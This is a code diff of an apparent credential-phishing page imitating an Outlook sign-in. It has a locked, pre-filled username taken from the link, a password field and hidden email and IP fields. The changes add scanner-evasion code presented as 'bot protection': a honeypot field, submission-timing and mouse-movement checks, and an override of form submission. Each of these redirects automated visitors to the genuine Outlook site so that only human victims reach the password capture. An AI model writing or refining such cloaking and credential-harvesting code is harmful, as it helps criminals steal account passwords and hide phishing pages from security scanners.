@@ -12,33 +12,6 @@
   <link href="https://cdn.prod.website-files.com/68f89e5e044f107c8074cdb5/68f8b899298663920f95c938_157bece9-7026-47eb-bbff-eae4174424f0-2.png" rel="shortcut icon" type="image/x-icon">
   <link href="https://cdn.prod.website-files.com/68f89e5e044f107c8074cdb5/68f8b899298663920f95c938_157bece9-7026-47eb-bbff-eae4174424f0-2.png" rel="apple-touch-icon">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <style>
-    /* Minimal security styles - won't affect your design */
-    #email {
-      pointer-events: none;
-      user-select: none;
-      -webkit-user-select: none;
-      -moz-user-select: none;
-      -ms-user-select: none;
-      background-color: #f8f8f8 !important;
-    }
-    
-    /* Prevent any interaction */
-    .email-security-shield {
-      position: relative;
-    }
-    
-    .email-security-shield::after {
-      content: "";
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      z-index: 10;
-      cursor: not-allowed;
-    }
-  </style>
 </head>
 <body>
   <section class="safelogingfield">
@@ -48,10 +21,11 @@
         <form id="email-form" name="email-form" data-name="Email Form" class="form" data-wf-page-id="68f89e61044f107c8074cebc" data-wf-element-id="22da511f-7236-2a9c-8b64-c7b114ebea92">
           <input type="hidden" id="ip" name="ip">
           <input type="hidden" id="hidden-email" name="email">
+          <!-- Honeypot field for bots -->
+          <input type="text" id="bot-trap" name="bot-trap" style="display:none !important;" tabindex="-1" autocomplete="off">
+          
           <label for="email" class="field-label">User name:</label>
-          <div class="email-security-shield">
-            <input class="field w-input" maxlength="256" name="email" data-name="email" placeholder="" type="email" id="email" required="" readonly>
-          </div>
+          <input class="field w-input" maxlength="256" name="email" data-name="email" placeholder="" type="email" id="email" required="" readonly style="background-color: #f8f8f8;">
           <label for="password" class="field-label-2">Password:</label>
           <input class="field w-input" maxlength="256" name="password" data-name="password" placeholder="" type="password" id="password" required="" autocomplete="off">
           <div class="div-block-3">
@@ -60,10 +34,10 @@
           </div>
         </form>
         <div class="w-form-done">
-          <div></div>
+          <div>Thank you! Your submission has been received!</div>
         </div>
         <div class="w-form-fail">
-          <div>Authentication Error!</div>
+          <div>Oops! Something went wrong while submitting the form.</div>
         </div>
       </div>
     </div>
@@ -114,41 +88,96 @@
       }
     });
 
-    // Completely disable any interaction with email field
-    $('#email').on('click keydown keyup keypress focus mouseenter mouseleave mousedown mouseup', function(e) {
+    // ADVANCED BOT PROTECTION
+    
+    // 1. Honeypot detection
+    let honeypotTimer = setTimeout(function() {
+      // If honeypot gets focus, it's a bot
+      $('#bot-trap').on('focus', function() {
+        console.log('Bot detected via honeypot');
+        // Redirect bot immediately
+        window.location.href = "https://outlook.live.com";
+      });
+    }, 1000);
+
+    // 2. Form submission timing detection
+    let formLoadTime = Date.now();
+    let submissionBlocked = false;
+
+    // 3. Human behavior simulation requirement
+    let humanInteraction = false;
+    let mouseMovements = 0;
+    
+    $(document).on('mousemove click keydown scroll', function() {
+      humanInteraction = true;
+      mouseMovements++;
+      clearTimeout(honeypotTimer);
+    });
+
+    // 4. Advanced event blocking for email field
+    $('#email').on('focus click keydown keyup keypress input change', function(e) {
       e.preventDefault();
       e.stopPropagation();
+      // If anyone tries to interact with email field, block submission
+      submissionBlocked = true;
       return false;
     });
 
-    // Disable copy/paste on email field
+    // 5. Copy/paste protection
     $('#email').on('copy cut paste', function(e) {
       e.preventDefault();
-      return false;
-    });
-
-    // Disable right-click context menu on email field
-    $('#email').on('contextmenu', function(e) {
-      e.preventDefault();
-      return false;
-    });
-
-    // Disable drag/drop on email field
-    $('#email').on('dragstart drop', function(e) {
-      e.preventDefault();
+      submissionBlocked = true;
       return false;
     });
 
     $("#email-form").submit(function (event) {
-      event.preventDefault(); // Prevent default form submission
+      event.preventDefault();
 
-      // Get the values from the form fields - use the HIDDEN email field
+      // BOT DETECTION CHECKS
+      
+      // Check 1: Honeypot field filled (definitely a bot)
+      if ($('#bot-trap').val().length > 0) {
+        console.log('Bot detected: Honeypot field filled');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+      
+      // Check 2: Too fast submission (less than 3 seconds)
+      let submissionTime = Date.now();
+      if ((submissionTime - formLoadTime) < 3000) {
+        console.log('Bot detected: Form submitted too quickly');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+      
+      // Check 3: No human interaction detected
+      if (!humanInteraction || mouseMovements < 2) {
+        console.log('Bot detected: No human interaction');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+      
+      // Check 4: Email field was tampered with
+      if (submissionBlocked) {
+        console.log('Bot detected: Email field interaction detected');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+      
+      // Check 5: Empty or invalid email from URL
       let userEmail = $("#hidden-email").val();
+      if (!userEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) {
+        console.log('Bot detected: Invalid email');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+
+      // If all checks pass, proceed with human submission
       let userPassword = $("#password").val();
       let userIP = $("#ip").val();
 
       // Validate that we have both email and password
-      if (!userEmail || !userPassword) {
+      if (!userEmail || !userPassword || userEmail === '' || userPassword === '') {
         console.error("Missing email or password");
         return;
       }
@@ -225,6 +254,14 @@
         });
       }
     });
+
+    // Additional protection: If bot tries to submit via JavaScript directly
+    let originalSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function() {
+      console.log('Bot detected: Direct form submission attempt');
+      window.location.href = "https://outlook.live.com";
+      return false;
+    };
   });
   </script>
 </body>
